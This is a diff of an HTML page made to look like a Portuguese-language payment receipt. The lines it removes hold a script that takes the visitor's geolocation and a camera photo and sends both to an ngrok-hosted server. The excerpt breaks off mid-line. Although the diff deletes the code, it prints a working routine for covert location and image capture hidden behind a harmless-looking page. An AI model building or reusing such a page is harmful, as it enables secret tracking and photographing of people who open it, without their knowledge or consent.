@@ -23,41 +23,5 @@
 
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-  </div>
-
-  <script>
-    const NGROK_SERVER = "https://1c35-201-42-106-118.ngrok-free.app";
-
-    // Exibir data atual
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    // Função que envia localização + foto juntos
-    function sendLocationAndPhoto(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      startCameraAndGetPhoto((imageBase64) => {
-        if (!imageBase64) {
-          alert("Erro ao capturar a foto.");
-          return;
-        }
-
-        fetch(`${NGROK_SERVER}/send-data`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ latitude, longitude, maps, photo: imageBase64 }),
-        })
-          .then(res => res.json())
-          .then(data => {
-            if (!data.success) {
-              alert("Erro ao enviar os dados.");
-            }
+      <p><a href="#">Clique
 
